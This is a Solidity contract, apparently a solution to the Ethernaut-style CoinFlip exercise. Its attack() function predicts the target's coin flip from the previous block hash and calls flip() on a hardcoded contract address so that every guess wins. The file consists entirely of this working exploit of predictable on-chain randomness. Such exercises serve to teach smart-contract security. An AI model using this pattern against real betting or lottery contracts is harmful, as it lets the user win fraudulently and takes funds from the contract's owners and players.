//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);

    function consecutiveWins() external view returns (uint256);
}

contract CoinFlip {
    ICoinFlip internal coinFlipContract;
    uint256 internal lastBlock;
    uint256 internal lastHash;
    uint internal FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
        coinFlipContract = ICoinFlip(
            0x6C53e401F19FaBd22bd04AD79Dc196C78ac00634
        );
        lastBlock = block.number;
    }

    function attack() public returns (uint256 num) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);

        return coinFlipContract.consecutiveWins();
    }
}
